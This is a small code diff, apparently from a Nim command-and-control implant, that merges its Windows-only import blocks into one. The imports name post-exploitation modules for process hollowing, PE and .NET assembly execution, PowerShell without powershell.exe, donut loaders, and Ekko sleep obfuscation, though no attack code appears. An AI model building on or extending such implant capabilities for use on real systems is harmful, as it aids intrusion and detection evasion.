@@ -33,10 +33,6 @@ import tasks/redirect
 import tasks/getenv as taskGetenv
 import tasks/connect
 
-when defined(windows):
-  import tasks/link
-  import profiles/smb_profile
-
 # Cross-platform commands
 import tasks/portscan
 import tasks/ifconfig
@@ -44,8 +40,9 @@ import tasks/netstat
 import tasks/config as taskConfig
 import tasks/pkill
 
-# Windows-only commands
 when defined(windows):
+  import tasks/link
+  import profiles/smb_profile
   import tasks/execute_assembly
   import tasks/inline_execute
   import tasks/powerpick
@@ -74,9 +71,6 @@ when defined(windows):
   import tasks/donut
   import tasks/inject_hollow
   import tasks/run_pe
-
-# Conditional imports for Windows-only features
-when defined(windows):
   when defined(sleepObfuscationEkko):
     import utils/ekko
 
